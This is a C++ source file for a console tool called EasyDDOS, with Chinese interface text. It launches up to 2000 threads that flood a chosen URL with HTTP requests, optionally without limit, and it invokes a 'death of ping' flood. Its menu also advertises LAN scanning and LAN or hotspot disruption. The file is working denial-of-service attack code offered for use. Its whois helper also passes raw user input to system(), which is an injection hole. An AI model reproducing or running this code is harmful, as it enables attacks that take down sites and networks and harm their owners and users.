//
// Created by ubuntu on 24-2-10.
//
#include "config.h"
#include "thread"
using namespace std;

string version_name = "1.0 Public";

[[noreturn]] void http_attack_one_thread(string number , string target , int j) {
    auto* httpRequests = new HttpRequests(target);
    try {
        if (number == "max") {
            int run_number = 0;
            while (true) {
                httpRequests->GetRequest();
                run_number += 1;
                if (run_number % 1000 == 0) {
                    cout << "[INFO] Attack " << target << " Number: " << run_number << " Thread: " << j << endl;
                }
            }
        } else {
            int run_number = 0;
            for (int i = 0 ; i < stoi(number) ; i++) {
                httpRequests->GetRequest();
                run_number += 1;
                //cout << run_number << endl;
                if (run_number % 1000 == 0) {
                    cout << "[INFO] Attack " << target << " Number: " << run_number << " Thread: " << j << endl;
                }
            }
            cout << "\n[FINISH] Attack Finish." << endl;
        }
    }catch (const runtime_error & e) {
        cout << e.what() << endl;
    }
}

void HttpAttack() {
    cout << "[!] Http攻击 ==>" << endl;
    try {
        string target = trim(input("输入攻击目标 URL: "));
        int thread = stoi(trim(input("输入模拟的用户数量(最高 2000): ")));
        if (thread > 2000) {
            throw runtime_error("输入线程数量大于 2000");
        }
        string number = trim(input("输入当个用户发送的数据量(输入max则不限量): "));
        std::vector<std::future<void>> futures;

        futures.reserve(thread);
        for (int i = 0 ; i < thread ;i++){
            futures.emplace_back(std::async(http_attack_one_thread, number , target , i));
        }

    }catch (const runtime_error &e) {
        cout << "错误的输入: " << e.what() << endl;
    }
}

void whois() {
    string target = trim(input("输入要查询的网站: "));
    system(("whois " + target).c_str());
}

void printLogo() {
    string logo_string = R"(
     _____                ____  ____   ___  ____
    | ____|__ _ ___ _   _|  _ \|  _ \ / _ \/ ___|
    |  _| / _` / __| | | | | | | | | | | | \___ \
    | |__| (_| \__ \ |_| | |_| | |_| | |_| |___) |
    |_____\__,_|___/\__, |____/|____/ \___/|____/
                     |___/
    )";
    printf("%s" , logo_string.c_str());
}

void printHelp() {
    string help_info = R"(
 -1- HTTP攻击          按下 1                模拟若干用户不停发送HTTP请求
 -2- 死亡之ping        按下 2                模拟若干用户不停发送ping攻击
 -3- 局域网扫描         按下 3                扫描所有局域网网段，并且获取目标的基础信息
 -4- 局域网/热点破坏     按下 4                利用局域网扫描信息实施局域网/热点网络环境破坏
 -5- Whois工具         按下 5                通过 whois 工具查询网站信息
    )";
    cout << help_info.c_str() << endl;
}

int main() {
    /**
     * 确保登录用户必须为root，否则就退出.
     * 因为有一些功能确实用root是比较好的.
     */
    if (get_login_user_linux() != "root") {
        cout << "Login user must be 'root'." << endl;
        return 1;
    }

    printLogo();
    cout << " [!] Version: " << version_name.c_str() << endl;
    cout << "Input 'help' to get help information." << endl;

    printHelp();
    while (true) {
        string command = trim(input("EasyDDOS Console $ "));
        if (command.empty()) {
            continue;
        }
        else if (command == "q") {
            break;
        }
        else if (command == "help") {
            printHelp();
        }
        else if (command == "1") {
            HttpAttack();
        }
        else if (command == "2") {
            auto* death_ping = new DeathOfPing();
            death_ping->Console();
        }
        else if (command == "5") {
            whois();
        }
        else {
            cout << "[!] ERROR INPUT: " << command << endl; // error command.
        }
    }
    return 0;
}